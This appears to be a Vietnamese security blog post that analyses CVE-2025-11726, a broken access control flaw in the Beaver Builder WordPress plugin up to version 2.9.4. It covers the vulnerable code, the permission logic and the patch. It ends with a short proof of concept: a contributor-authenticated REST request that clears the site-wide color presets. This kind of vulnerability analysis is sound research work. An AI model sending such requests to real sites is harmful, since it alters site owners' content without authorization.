# CVE-2025-11726 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Beaver Builder – WordPress Page Builder** cho WordPress tồn tại lỗ hổng **Missing Authorization** (thiếu phân quyền) trong tất cả các phiên bản cho đến và bao gồm **2.9.4**. Nguyên nhân là do **capability checks** không đầy đủ trong các **REST API endpoints** thuộc namespace **`fl-controls/v1`**, nơi kiểm soát các **Global Presets** trên toàn bộ website. Điều này cho phép các **authenticated attackers** có quyền từ mức **contributor** trở lên có thể **add, modify hoặc delete** các **global color presets** và **background presets**, từ đó ảnh hưởng đến toàn bộ nội dung sử dụng **Beaver Builder** trên toàn site.

* **CVE ID**: [CVE-2025-11726](https://www.cve.org/CVERecord?id=CVE-2025-11726)
* **Vulnerability Type**: Broken Access Control
* **Affected Versions**: <= 2.9.4
* **Patched Versions**: 2.9.4.1
* **CVSS severity**: Low (5.4)
* **Required Privilege**: Contributor
* **Product**: [WordPress Beaver Builder Plugin](https://wordpress.org/plugins/beaver-builder-lite-version/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Beaver Builder**:  
    * `2.9.4` – **vulnerable**  
    * `2.9.4.1` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Analysis 
**Trong phiên bản lỗi (v2.9.4):**

```php {title="class-fl-controls.php v2.9.4" data-open=true hl_lines=[4,10,16]}
static public function register_rest_endpoints() {
    ...
    register_rest_route( 'fl-controls/v1', '/color_presets/', array(
        'methods'             => WP_REST_Server::CREATABLE,
        'callback'            => __CLASS__ . '::set_color_presets',
        'permission_callback' => __CLASS__ . '::check_permission',
    ) );

    register_rest_route( 'fl-controls/v1', '/color_presets/', array(
        'methods'             => WP_REST_Server::DELETABLE,
        'callback'            => __CLASS__ . '::delete_color_presets',
        'permission_callback' => __CLASS__ . '::check_permission',
    ) );

    register_rest_route( 'fl-controls/v1', '/background_presets/', array(
        'methods'             => WP_REST_Server::CREATABLE,
        'callback'            => __CLASS__ . '::set_background_presets',
        'permission_callback' => __CLASS__ . '::check_permission',
    ) );
    ...
}
```

Plugin đã đăng ký một **REST API endpoints** thuộc namespace **`fl-controls/v1`**, có thể **add, modify hoặc delete** các **global color presets** và **background presets**.

Các API này kiểm soát truy cập thông qua callback `check_permission`

```php {title="class-fl-controls.php v2.9.4" data-open=true hl_lines=[]}
static public function check_permission() {
    return FLBuilderUserAccess::current_user_can( 'builder_access' );
}
```

Plugin đã custom một hàm `current_user_can` riêng và sử dụng kiểm tra quyền `builder_access`

```php {title="class-fl-controls.php v2.9.4" data-open=true hl_lines=[3]}
public static function register_default_settings() {
    self::register_setting( 'builder_access', array(
        'default'     => 'all',
        'group'       => __( 'Frontend', 'fl-builder' ),
        'label'       => __( 'Builder Access', 'fl-builder' ),
        'description' => __( 'The selected roles will have access to the builder for editing posts, pages, and CPTs.', 'fl-builder' ),
        'order'       => '1',
    ) );

    self::register_setting( 'unrestricted_editing', array(
        'default'     => 'all',
        'group'       => __( 'Frontend', 'fl-builder' ),
        'label'       => __( 'Unrestricted Editing', 'fl-builder' ),
        'description' => __( 'The selected roles will have unrestricted access to all editing features within the builder.', 'fl-builder' ),
        'order'       => '2',
    ) );
}
```

`builder_access` được đăng ký thông qua hàm `register_setting` với `'default' => 'all'` tức là dành cho tất cả các user.

> [!QUESTION] 
> `builder_access`: Dành cho tất cả các user thì tại sao lỗ hổng được công bố với đặc quyền Contributor?

Câu trả lời nằm trong logic của hàm `current_user_can` của plugin:

```php {title="class-fl-builder-user-access.php v2.9.4" data-open=true hl_lines=[3]}
static public function current_user_can( $key ) {
    $user     = wp_get_current_user();
    $settings = self::get_saved_settings();

    // Return false if no settings saved.
    if ( ! isset( $settings[ $key ] ) ) {
        return false;
    }

    // Make sure super admins have administrator access.
    if ( is_multisite() && is_super_admin() && ! in_array( 'administrator', $user->roles ) ) {
        $user->roles[] = 'administrator';
    }

    // Check the user's roles against the saved settings.
    foreach ( $user->roles as $role ) {

        // Return true if the user has access.
        if ( isset( $settings[ $key ][ $role ] ) && $settings[ $key ][ $role ] ) {
            return true;
        }
    }

    return false;
}
```

Hàm `current_user_can` kiểm tra quyền dựa trên **role + plugin settings**, không dựa trên capability chuẩn của WordPress. Hàm sẽ gọi đến ` self::get_saved_settings()` để lấy các setting:

```php {title="class-fl-builder-user-access.php v2.9.4" data-open=true hl_lines=[6]}
static public function get_saved_settings() {
    if ( self::$settings ) {
        return self::$settings;
    }

    $roles       = self::get_all_roles();
    $settings    = FLBuilderModel::get_admin_settings_option( '_fl_builder_user_access', true );
    $ms_settings = FLBuilderModel::get_admin_settings_option( '_fl_builder_user_access', false );
    $ms_support  = FLBuilderAdminSettings::multisite_support();

    if ( ! is_array( $settings ) ) {
        $settings = array();
    }

    foreach ( self::$registered_settings as $key => $data ) {

        if ( ! isset( $settings[ $key ] ) ) {
            if ( $ms_support && isset( $ms_settings[ $key ] ) ) {
                $settings[ $key ] = $ms_settings[ $key ];
            } else {
                $settings[ $key ] = array();
            }
        }

        foreach ( $roles as $role_key => $role_data ) {

            if ( ! isset( $settings[ $key ][ $role_key ] ) ) {

                if ( ! isset( $data['default'] ) || ! $data['default'] ) {
                    $settings[ $key ][ $role_key ] = false;
                } elseif ( is_array( $data['default'] ) ) {

                    if ( in_array( $role_key, $data['default'] ) ) {
                        $settings[ $key ][ $role_key ] = true;
                    } else {
                        $settings[ $key ][ $role_key ] = false;
                    }
                } else {
                    $settings[ $key ][ $role_key ] = true;
                }
            }
        }
    }

    self::$settings = $settings;

    return $settings;
}
```

Hàm `get_saved_settings` có nhiệm vụ lấy và chuẩn hoá cấu hình phân quyền theo role từ option `_fl_builder_user_access`, áp dụng giá trị mặc định (`default`) cho từng `$key` và từng `role`, rồi cache vào `self::$settings`. Roles được lấy thông qua việc gọi hàm `self::get_all_roles()`:

```php {title="class-fl-builder-user-access.php v2.9.4" data-open=true hl_lines=[6]}
static public function get_all_roles() {
    if ( ! function_exists( 'get_editable_roles' ) ) {
        require_once ABSPATH . 'wp-admin/includes/user.php';
    }

    $editable_roles = get_editable_roles();
    $roles          = array();
    $caps           = apply_filters( 'fl_builder_user_access_capabilities', array( 'edit_posts' ) );

    foreach ( $editable_roles as $role => $data ) {
        foreach ( $caps as $cap ) {
            if ( isset( $data['capabilities'][ $cap ] ) && 1 == $data['capabilities'][ $cap ] ) {
                $roles[ $role ] = $data['name'];
            }
        }
    }

    return $roles;
}
```

Hàm `get_all_roles()` trả về danh sách các **role có capability nhất định**, mặc định là `edit_posts` — tức là thực tế bao gồm các role từ **Contributor trở lên**. ==Đây chính là câu trả lời==.

**Bản vá (v2.9.4.1):**

Thay `check_permission` bằng `check_write_permission`

![Diff1](diff1.png "Sử dụng check_write_permission thay cho check_permission")

Yêu cầu đồng thời hai quyền nội bộ của plugin: `unrestricted_editing` và `builder_access`

```php {title="class-fl-controls.php v2.9.4.1" data-open=true hl_lines=[]}
static public function check_write_permission() {
    return ( FLBuilderUserAccess::current_user_can( 'unrestricted_editing' ) && FLBuilderUserAccess::current_user_can( 'builder_access' ) );
}
```

Hai quyền này được sửa lại, chỉ dành cho `administrator` và `editor`.

![Diff2](diff2.png "Thay đổi quyền")

---

**Các callback tương ứng với các endpoint:**

```php {title="POST fl-controls/v1/color_presets/"}
static public function set_color_presets( $request ) {
    $color_presets = (array) get_option( '_fl_builder_color_presets', [] );
    $params        = $request->get_params();

    if ( isset( $params['clearPresets'] ) && true === $params['clearPresets'] ) {
        if ( update_option( '_fl_builder_color_presets', [] ) ) {
            return new WP_REST_Response( [
                'presets' => [],
            ], 200 );
        }
    }

    // Dedupe the merged arrays
    $new_presets = array_unique( array_merge( $color_presets, $params['addPresets'] ) );

    update_option( '_fl_builder_color_presets', $new_presets );

    return new WP_REST_Response( [
        'presets' => $new_presets,
    ], 200 );
}
```

```php {title="DELETE fl-controls/v1/color_presets/"}
static public function delete_color_presets( $request ) {
    $color_presets = (array) get_option( '_fl_builder_color_presets', [] );
    $params        = $request->get_params();

    $new_presets = array_values( array_filter( $color_presets, function ( $color ) use ( $params ) {

        // Check for exact match and value w/ # prepended
        return ! in_array( $color, $params['deletePresets'] ) && ! in_array( '#' . $color, $params['deletePresets'] );
    } ) );

    if ( update_option( '_fl_builder_color_presets', $new_presets ) ) {
        $color_presets = $new_presets;
    }

    return new WP_REST_Response( [
        'presets' => $color_presets,
    ], 200 );
}
```

```php {title="POST fl-controls/v1/background_presets/"}
static public function set_background_presets( $request ) {
    $presets     = (array) get_option( '_fl_builder_color_presets', [] );
    $params      = $request->get_params();
    $new_presets = array_merge( $presets, $params['addPresets'] );

    if ( update_option( '_fl_builder_background_presets', $new_presets ) ) {
        $presets = $new_presets;
    }

    return new WP_REST_Response( [
        'presets' => $presets,
    ], 200 );
}
```

## Flow
{{< mermaid >}}
graph TD
A["Authenticated user (Contributor or higher)"]
--> B["Sends request to /wp-json/fl-controls/v1/*"]
--> C["REST API calls permission_callback = check_permission()"]
--> D["check_permission() → current_user_can('builder_access')"]
--> G["builder_access = true for Contributor"]
--> H["Request is accepted"]
--> I["set_color_presets / delete_color_presets / set_background_presets"]
--> J["Global Presets are added / modified / deleted site-wide"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Login Contributor account:
2. Lấy nonce bằng cách dán nội dung sau vào browser console:

```js
wpApiSettings.nonce
```
3. Thêm X-WP-Nonce header và gửi request:

```http
POST /wp-json/fl-controls/v1/color_presets/ HTTP/1.1
Cookie: contributor_cookie
X-WP-Nonce: 0db9546893

{
  "clearPresets": true
}
```

Làm tương tự cho các endpoint còn lại.

## Conclusion

CVE-2025-11726 là lỗi **Broken Access Control** xuất phát từ việc plugin chỉ kiểm tra quyền nội bộ `builder_access` — quyền này mặc định áp dụng cho các role có `edit_posts` (tức **Contributor trở lên**). Vì vậy, chỉ cần đăng nhập, attacker đã có thể **thêm, sửa, xoá Global Presets** thông qua REST API `fl-controls/v1`, ảnh hưởng toàn bộ nội dung Beaver Builder trên site.

Bản vá **v2.9.4.1** đã khắc phục bằng cách thay `check_permission` bằng `check_write_permission`, yêu cầu **đồng thời** `builder_access` và `unrestricted_editing`, đồng thời giới hạn về **Editor và Administrator**.

## Key Takeaways

* Có xác thực ≠ có đủ quyền (Authentication ≠ Authorization)
* Không nên dùng **default = all** cho quyền nhạy cảm
* Custom permissions phải map đúng với **WordPress core capabilities**
* Endpoint thay đổi **global settings** phải yêu cầu quyền cao (Admin/Editor)
* So sánh (diff) giữa bản lỗi và bản vá là cách nhanh để phát hiện lỗi logic phân quyền
* Cần nhiều lớp kiểm tra quyền cho các hành động quan trọng

## References
[Broken Access Control](https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/)

[WordPress Beaver Builder Plugin <= 2.9.4 is vulnerable to Broken Access Control](https://patchstack.com/database/wordpress/plugin/beaver-builder-lite-version/vulnerability/wordpress-beaver-builder-wordpress-page-builder-plugin-2-9-4-missing-authorization-to-authenticated-contributor-global-preset-modification-vulnerability)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-07-cve-2025-11726/  

